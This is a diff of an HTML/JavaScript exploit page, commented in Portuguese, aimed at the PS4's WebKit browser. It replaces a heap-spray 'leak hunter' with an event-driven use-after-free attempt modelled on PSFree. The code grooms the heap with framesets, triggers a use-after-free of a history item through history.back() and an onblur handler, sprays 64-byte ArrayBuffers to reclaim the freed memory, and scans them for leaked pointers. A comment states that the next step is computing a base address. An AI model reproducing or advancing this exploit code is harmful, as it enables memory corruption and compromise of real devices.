@@ -2,29 +2,28 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 WebKit - The Listener (Leak)</title>
+<title>PS4 WebKit - Focus/Blur Exploit</title>
 <style>
-    body { background-color: #000; color: #aaaaff; font-family: monospace; padding: 20px; }
+    body { background-color: #000; color: #ff00ff; font-family: monospace; padding: 20px; }
     button { 
         padding: 20px; width: 100%; margin-bottom: 10px;
         font-weight: bold; font-size: 16px; cursor: pointer; 
-        border: 2px solid #55f; background: #000033; color: #fff;
+        border: 2px solid #f0f; background: #202; color: #fff;
     }
-    #log { border: 1px solid #335; margin-top: 20px; padding: 10px; white-space: pre-wrap; height: 400px; overflow-y: scroll;}
-    .leak { background-color: #fff; color: #f00; font-size: 1.2em; font-weight: bold; border: 5px solid #f00; }
+    #log { border: 1px solid #555; margin-top: 20px; padding: 10px; white-space: pre-wrap; height: 400px; overflow-y: scroll;}
+    .leak { background-color: #fff; color: #f00; font-size: 1.5em; font-weight: bold; border: 5px solid #f00; padding: 10px; }
 </style>
 </head>
 <body>
-<h2>PS4 WebKit - Memory Leak Hunter (64 bytes)</h2>
-<div id="status">Alvo: Capturar escrita do sistema...</div>
-<button onclick="runLeakExploit()">INICIAR CAÇADA</button>
+<h2>PS4 WebKit - Event-Driven Reclaim (PSFree Logic)</h2>
+<div id="status">Método: input.onblur (Zero Delay)</div>
+<button onclick="runEventExploit()">INICIAR ATAQUE DE EVENTO</button>
 <div id="log"></div>
 
 <script>
 const logEl = document.getElementById("log");
 const statusEl = document.getElementById("status");
-let keepAlive = [];
-let targetViews = []; // Aqui guardamos as "janelas" para a memória
+let views = []; // Mantém as views vivas
 
 function log(m) { 
     const d = document.createElement("div");
@@ -35,112 +34,135 @@ function log(m) {
 
 function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
 
-async function runLeakExploit() {
-    logEl.innerHTML = "";
-    keepAlive = [];
-    targetViews = [];
-    statusEl.innerText = "Preparando armadilhas...";
-
-    // 1. Preparação (Grooming com 64 bytes)
-    // Criamos buffers e guardamos referências para suas views (Uint32Array)
-    // Assim podemos ler o conteúdo deles depois do UAF
-    log("1. Espalhando 5000 armadilhas de 64 bytes...");
+// TÉCNICA PSFREE: Preparar o terreno com framesets
+// Isso isola o HistoryItem para que ele caia num lugar previsível
+var fsets = [];
+function prepare_heap() {
+    log("1. Preparando Heap (Grooming)...");
+    const COMMAS = 8; // Pequeno, só para alinhar fastMalloc
+    const ROWS = ",".repeat(COMMAS);
     
-    for(let i=0; i<5000; i++) {
-        let buf = new ArrayBuffer(64);
-        let view = new Uint32Array(buf);
-        view.fill(0x41414141); // Enche com 'AAAA'
-        
-        // Guardamos para impedir GC e para checar depois
-        keepAlive.push(buf);
-        
-        // A cada 2, guardamos a view para verificação rápida (otimização)
-        if(i % 2 === 0) targetViews.push(view);
+    for(let i=0; i<200; i++) {
+        let f = document.createElement("frameset");
+        f.rows = ROWS;
+        fsets.push(f);
     }
-    
-    // Swiss Cheese (Buracos)
-    // Liberamos alguns para o UAF cair no meio
-    let holes = [];
-    for(let i=0; i<keepAlive.length; i+=10) {
-        keepAlive[i] = null; // Libera
-    }
-    
-    // Força GC leve
-    new ArrayBuffer(1024 * 1024);
-
-    // 2. Trigger UAF
-    log("2. Disparando UAF (Loop 48)...");
-    let size = 977;
-    const STEP = 14461;
-
-    for(let i = 0; i < 48; i++) {
-        let frag = "V".repeat(size); 
-        history.pushState({}, "", "#" + frag);
-        history.replaceState({}, "", "#" + frag.slice(0, frag.length >> 1));
-        
-        if(i % 6 === 0) setTimeout(() => history.back(), 0);
-        
-        if (i === 47) {
-            // MOMENTO CRÍTICO
-            setTimeout(() => history.back(), 0);
-            
-            // Spray final para ocupar o lugar do UAF
-            log(">>> RECLAIMING <<<");
-            for(let k=0; k<1000; k++) {
-                let buf = new ArrayBuffer(64);
-                let view = new Uint32Array(buf);
-                view.fill(0x41414141);
-                targetViews.push(view); // Adiciona à lista de checagem
-                keepAlive.push(buf);
-            }
-        }
-        size += STEP;
-        await sleep(5);
-    }
-    
-    await sleep(200);
-    
-    // 3. A Varredura (Scan)
-    log("3. Analisando armadilhas por alterações...");
-    checkTraps();
 }
 
-function checkTraps() {
-    let found = false;
-    let leakedData = [];
+async function runEventExploit() {
+    logEl.innerHTML = "";
+    views = [];
+    fsets = [];
+    statusEl.innerText = "Rodando...";
+
+    prepare_heap();
+
+    // Cria elementos DOM necessários para o truque do foco
+    const input = document.createElement("input");
+    input.style.opacity = "0";
+    document.body.appendChild(input);
     
-    // Varre todas as nossas views.
-    // Se o UAF funcionou, o navegador escreveu algo (provavelmente um ponteiro ou contador)
-    // dentro de um dos nossos buffers, sobrescrevendo os 'AAAA'.
-    
-    for(let i=0; i < targetViews.length; i++) {
-        let view = targetViews[i];
+    const anchor = document.createElement("a");
+    anchor.id = "bar"; // Âncora para navegação
+    document.body.appendChild(anchor);
+
+    // Variáveis de controle
+    let uaf_triggered = false;
+
+    // --- O GATILHO MÁGICO (ONBLUR) ---
+    // Isso roda EXATAMENTE quando o history.back() processa a troca de página
+    input.onblur = function() {
+        log(">>> EVENTO BLUR DISPARADO <<<");
         
-        // Checa apenas o início (onde headers costumam ser escritos)
-        if(view[0] !== 0x41414141 || view[1] !== 0x41414141) {
-            found = true;
-            log(`!!! DETECTADO !!! Buffer #${i} foi modificado!`);
+        // 1. Limpa os framesets vizinhos (abre espaço)
+        // Isso é crucial no psfree: libera memória AO REDOR do alvo
+        for(let f of fsets) {
+            f.rows = "";
+        }
+        fsets = []; // Deixa o GC limpar
+
+        // 2. SPRAY IMEDIATO (RECLAIM)
+        // Tamanho 64 bytes (Confirmado pelo teste CCCC)
+        log("Spraying 2000 buffers de 64 bytes...");
+        for(let i=0; i<2000; i++) {
+            // Cria ArrayBuffer e Uint32Array view
+            let buf = new ArrayBuffer(64);
+            let view = new Uint32Array(buf);
             
-            // Captura o dump
-            let hex0 = "0x" + view[0].toString(16).padStart(8,'0');
-            let hex1 = "0x" + view[1].toString(16).padStart(8,'0');
-            let hex2 = "0x" + view[2].toString(16).padStart(8,'0');
-            let hex3 = "0x" + view[3].toString(16).padStart(8,'0');
+            // Marca com AAAA para ver se é sobrescrito
+            view[0] = 0x41414141; 
+            view[1] = 0x41414141;
             
-            log(`Dados: ${hex0} ${hex1} ${hex2} ${hex3}`);
-            leakedData.push({idx: i, data: [hex0, hex1]});
+            views.push(view);
+        }
+        
+        uaf_triggered = true;
+    };
+
+    // --- SEQUÊNCIA DE DISPARO ---
+    log("2. Configurando Histórico...");
+    
+    // Empilha estados para poder voltar
+    // Usamos fragmentos (#) para não recarregar a página inteira
+    history.pushState("state1", "", "#foo");
+    history.pushState("state2", "", "#bar");
+
+    log("3. Focando input e disparando back()...");
+    
+    // Força o foco no input
+    input.focus();
+    
+    // Pequena pausa para o navegador registrar o foco
+    await sleep(100);
+    
+    // O DISPARO:
+    // history.back() vai tentar ir para #foo.
+    // Isso tira o foco do input -> dispara onblur -> executa o spray.
+    // Tudo numa única thread síncrona.
+    history.back();
+
+    // Espera o evento acontecer
+    await sleep(500);
+
+    if(!uaf_triggered) {
+        log("Erro: O evento onblur não disparou. Tente clicar na página antes.");
+        return;
+    }
+
+    // --- VERIFICAÇÃO ---
+    log("4. Checando se algum buffer foi corrompido...");
+    
+    let leaked = false;
+    for(let i=0; i<views.length; i++) {
+        let v = views[i];
+        // Se o primeiro inteiro não for mais AAAA, algo escreveu nele!
+        if(v[0] !== 0x41414141) {
+            leaked = true;
+            log(`!!! LEAK DETECTADO NO INDEX ${i} !!!`);
             
-            // Paramos no primeiro leak sólido
+            let v0 = "0x" + v[0].toString(16).padStart(8,'0');
+            let v1 = "0x" + v[1].toString(16).padStart(8,'0');
+            
+            log(`Valor Original: 0x41414141`);
+            log(`Valor Novo:     ${v0}`);
+            log(`Próximo Valor:  ${v1}`);
+            
             statusEl.className = "leak";
-            statusEl.innerText = `LEAK CONFIRMADO: ${hex0}`;
-            break; 
+            statusEl.innerText = `LEAK: ${v0}`;
+            
+            // Se conseguirmos isso, o próximo passo é usar esse leak para calcular o endereço base.
+            break;
         }
     }
-    
-    if(!found) {
-        log("Falha: Nenhum buffer foi tocado. Todos ainda são 'AAAA'.");
-        log("Dica: Tente clicar novamente. A persistência é chave.");
+
+    if(!leaked) {
+        log("Falha: Todos os buffers continuam 'AAAA'.");
+        log("Possível causa: O GC não rodou rápido o suficiente ou o tamanho 64 precisa de ajuste fino (+/- 16).");
     }
+    
+    // Limpeza
+    document.body.removeChild(input);
+    document.body.removeChild(anchor);
 }
 </script>
 </body>
